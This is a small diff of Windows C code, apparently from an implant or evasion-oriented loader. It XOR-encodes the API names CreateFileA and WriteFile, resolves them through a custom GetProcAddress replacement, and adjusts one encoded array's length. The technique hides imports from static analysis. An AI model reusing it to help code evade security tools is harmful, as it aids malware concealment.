@@ -648,8 +648,8 @@ void PopulateKernelFunctionPtrsByName(LPVOID lpvKernelDLL)
     MyXor(cCreateFileA, 11, key, 5);
     pCreateFileA = MyGetProcAddressByName(lpvKernelDLL, cCreateFileA);
 
-    char cWriteFile[] = {0x67, 0x42, 0x59, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x71, 0x0};
-    MyXor(cWriteFile, 10, key, 5);
+    char cWriteFile[] = {0x67, 0x42, 0x59, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x0};
+    MyXor(cWriteFile, 9, key, 5);
     pWriteFile = MyGetProcAddressByName(lpvKernelDLL, cWriteFile);
 }
 
